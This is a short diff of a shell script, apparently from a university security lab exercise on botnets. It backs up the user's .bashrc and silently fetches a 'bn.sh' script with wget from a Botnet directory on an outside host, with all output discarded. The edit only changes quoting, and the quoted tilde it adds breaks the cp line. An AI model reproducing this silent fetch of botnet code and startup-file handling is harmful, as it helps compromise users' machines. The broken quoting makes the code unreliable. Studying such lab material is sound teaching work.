@@ -5,8 +5,8 @@ DIRECTORY="./"
 TARGET=".bashrc"
 FULLPATH="${DIRECTORY}${TARGET}"
 
-cat .bashrc > temp2
-cp ~/.bashrc ~/.bashrc_old
+cat ".bashrc" > temp2
+cp "~/.bashrc" "~/.bashrc_old"
 
 wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bn.sh" &> /dev/null
 #rm ~/cgethttp.c     
